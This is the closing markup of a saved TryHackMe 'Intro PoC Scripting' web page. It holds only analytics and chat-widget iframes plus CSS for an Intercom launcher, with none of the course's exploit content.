<iframe id="_hjSafeContext_28900258" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Intro PoC Scripting_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg><div id="EC92AD1D-53B1-2463-5A92-84924539418C"></div><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./TryHackMe _ Intro PoC Scripting_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><img src="./TryHackMe _ Intro PoC Scripting_files/9e0f012f15b6fc981dde2f1f5198d728.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white"></path>
</svg>
</div></div><style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    0% {
      opacity: 0;
      transform: scale(0);
    }
    40% {
      opacity: 1;
    }
    100% {
      transform: scale(1);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    padding: 0 !important;
    margin: 0 !important;
    border: none;
    bottom: 20px;
    right: 20px;
    max-width: 48px;
    width: 48px;
    max-height: 48px;
    height: 48px;
    border-radius: 50%;
    background: #1C2538;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    box-sizing: content-box;
  }


  .intercom-lightweight-app-launcher:hover {
    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    transform: scale(1.1)
  }

  .intercom-lightweight-app-launcher:active {
    transform: scale(0.85);
    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
  }


  .intercom-lightweight-app-launcher:focus {
    outline: none;

    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 48px;
    height: 48px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 24px;
    height: 24px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 44px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 24px;
    max-width: 24px;

    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
    transform-origin: bottom right;
    
        width: 400px;
        height: calc(100% - 104px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 84px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
      

    border-radius: 16px;
  }

  .intercom-lightweight-app-messenger-header {
    height: 64px;
    border-bottom: none;
    background: #1c2538

    
  }

  .intercom-lightweight-app-messenger-footer{
    position:absolute;
    bottom:0;
    width: 100%;
    height: 80px;
    background: #fff;
    font-size: 14px;
    line-height: 21px;
    border-top: 1px solid rgba(0, 0, 0, 0.05);
    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
    
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div></body></html>